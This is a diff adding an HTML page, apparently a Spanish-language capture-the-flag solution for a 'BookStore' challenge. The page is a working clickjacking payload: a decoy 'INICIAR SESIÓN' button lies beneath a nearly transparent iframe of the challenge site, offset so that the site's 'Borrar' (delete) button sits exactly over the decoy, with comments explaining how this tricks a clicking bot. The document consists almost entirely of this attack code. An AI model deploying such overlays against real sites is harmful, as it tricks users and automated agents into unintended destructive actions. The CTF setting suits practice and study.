@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <title>Reto BookStore</title>
+    <style>
+        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; }
+
+        /* El botón que el bot BUSCA por ID */
+        #objetivo {
+            position: absolute;
+            top: 100px; /* Posición fija donde el bot lo encontrará rápido */
+            left: 50%;
+            transform: translateX(-50%);
+            width: 300px;
+            height: 60px;
+            z-index: 1; /* Está DEBAJO */
+        }
+
+        /* El IFRAME que RECIBE el clic */
+        iframe {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 1200px;
+            border: none;
+            z-index: 2; /* Está ENCIMA */
+            /* Ajustamos para que el botón 'Borrar' de la librería 
+               quede EXACTAMENTE sobre nuestro botón #objetivo */
+            margin-top: -680px; 
+            /* Opacidad muy baja para que el bot 'vea' a través del iframe */
+            opacity: 0.001; 
+        }
+    </style>
+</head>
+<body>
+
+    <button id="objetivo">INICIAR SESIÓN</button>
+
+    <iframe src="https://ctf.fap.hispasec.com:8018/books/1"></iframe>
+
+</body>
+</html>
